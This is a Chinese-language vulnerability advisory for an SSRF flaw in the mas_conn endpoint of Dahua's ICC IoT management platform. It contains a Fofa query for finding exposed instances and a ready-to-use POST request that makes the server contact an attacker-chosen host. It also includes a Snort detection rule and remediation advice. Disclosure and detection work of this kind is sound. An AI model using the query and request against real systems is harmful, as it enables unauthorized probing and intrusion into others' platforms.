# 大华ICC智能物联综合管理平台mas_conn存在SSRF漏洞

大华ICC智能物联综合管理平台mas_conn存在SSRF漏洞

# 影响版本

大华ICC智能物联综合管理平台 

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**Fofa:**  `body="static/qwebchannel.js" && body="/*客户端会小于800*/"`​

**POC/EXP：**

**step1 试用dnslog测试**

```
POST /evo-apigw/evo-cascade/mas/conn HTTP/1.1
Host: 127.0.0.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3

{
  "masPort": "80",
  "masIp": "[dnslogIP]"
}
```

​![image](assets/image-20260826233143-ox18sl5.png)​

**sonrt规则：**

```
alert tcp any any -> $HOME_NET any (
    msg:"大华ICC智能物联综合管理平台 - mas_conn SSRF漏洞";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/evo-apigw/evo-cascade/mas/conn"; fast_pattern;
    http.content_type; content:"application/json";
    http.request_body; content:"\"masIp\""; nocase;
    http.request_body; content:"\"masPort\""; nocase; distance:0;
    metadata:
        service http,
        affected_product "大华ICC智能物联综合管理平台",
        vulnerability_type "SSRF",
        severity "high";
    classtype:web-application-attack;
    sid:1000735;
    rev:1;
    priority:2;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。

‍
